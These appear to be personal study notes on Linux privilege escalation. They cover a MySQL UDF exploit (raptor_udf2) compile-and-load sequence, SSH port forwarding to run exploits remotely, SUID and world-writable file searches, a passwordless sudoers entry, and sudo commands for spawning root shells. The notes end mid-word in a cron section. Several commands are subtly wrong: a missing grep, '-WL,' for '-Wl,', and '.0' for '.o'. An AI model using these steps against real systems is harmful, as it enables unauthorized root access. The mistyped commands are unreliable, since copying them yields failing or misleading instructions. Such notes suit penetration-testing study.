----------------------------------------------
SERVICE EXPLOITS

this command will show all processes that are running as root:
ps aux | grep "^root"

Enumerating program versions:

Running the program with the --version/-v command line options often shows the version number:
program --version
program -v

on debian like distributions dpkg can show installed programs and their versions:
dpkg -l | grep <program>

on systems that use rpm, the following achieves the same:
rpm -qa | grep <program>

to see services running as root use this command:
ps aux | "^root"

EXAMPLE 
on the target machine we were able to figure out that the mysql proccess was running as root we figured this out with 
by running the ./lse.sh script

lse.sh -l 1

next we figured out the version of mysqld running with this command"
mysqld --version 

EXAMPLE CONTINUED UDF EXPLOIT COMMANDS:
*gcc note he says since we are using the 64 bit debian distro we need to provide the -fPIC option
exploit says use this command: gcc -g -c raptor_udf2.c
but we have to change it to this: gcc -g -c raptor_udf2.c -fPIC

first we have to compile the exploit with command:
gcc -g -c raptor_udf2.c

next we need to create a shared object from the compiled exploit:
gcc -g -shared -WL, -soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.0 -lc 

next we need to connect to mysql as the root user:
mysql -u root -p

PORT FORWARDING
in some instances a root process may be bound to an internal port, through which it communicates.

if for some reason an exploit cannot run locally on the target machine, the port can be forwarded 
using ssh to your local machine with command:

ssh -R <local-port>:127.0.0.1:<service-port> <username>@,local-machine>

the exploit code can now be run on your local machine at whichever port you choose
---------------------------------
Setuid programs 
An explanation of this command I gave a writeup earlier ago, but in short I searched for all files with the SUID bit set (perm 4000) and looked who the owner is. 
Because of the SUID bit, I can execute the program with the rights of the owner. the file that stands out is a file which is created recently 
(also a good indication).

this comand will search for all setuid programs:
find / -user root -perm -4000 -exec ls -ldb {} \;

this command will search for all setuid programs:
find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null

this command finds all files with the SUID bit set:
find / -perm -u=s -type f 2>/dev/null

IF WE CAN SOMEHOW WRITE OUR USER ON THE BOX INTO THE /ETC/SUDOERS WITH NO PASSWORD INTO THE FILE WE CAN ESCALATE TO ROOT
entry in sudoers file: student ALL(ALL) NOPASSWD:ALL
command: sudo /bin/bash

this command will look for files which is world writeable:
find / -not -type l -perm -o+w

-------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                                                          SUDO
run a program using sudo:
sudo <program>:

run a program as a specific user:
sudo -u <username> <program>

List programs a user is allowed (amd disallowed to run:
sudo -l 

spawning a root shell: 
sudo su

if the su progam is not allowed:
sudo -s
sudo -i 
sudo /bin/bash
sudo passwd

shell escape sequences:
https://gtfobins.github.io/

you can check if the sudo version is vulnerable using this grep:
sudo -V | grep "Sudo ver" | grep "1.6.8p9\|1.6.9p18\|1.8.14\|1.8.20\|1.6.9p21\|1.7.2p4\|1\.8\.[0123]$\|1\.3\.[^1]\|1\.4\.\d*\|1\.5\.\d*\|1\.6\.\d*\|1.5$\|1.6$"

--------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                                        `             CRON 
                                                       
figure out what cronjobs your user has access to:
crontab -l 

cront



































